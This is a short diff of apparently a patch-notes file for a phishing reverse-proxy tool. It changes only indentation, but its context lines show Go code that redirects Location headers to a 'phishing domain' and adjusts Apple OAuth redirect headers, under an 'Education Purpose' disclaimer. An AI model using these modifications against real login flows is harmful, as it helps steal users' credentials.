@@ -10,7 +10,7 @@ This is only for Education Purpose not use for harming to anyone.
 
 				} 	
         
- line no 652 to 665      
+ 	line no 652 to 665      
 			// if "Location" header is present, make sure to redirect to the phishing domain
 			r_url, err := resp.Location()
 			if err == nil {
@@ -26,7 +26,7 @@ This is only for Education Purpose not use for harming to anyone.
 				} 
 			}        
         
-line no 408	
+	line no 408	
 				// fix apple request header 
 				ref := req.Header.Get("X-Apple-Oauth-Redirect-Uri")
 				if ref != "" {
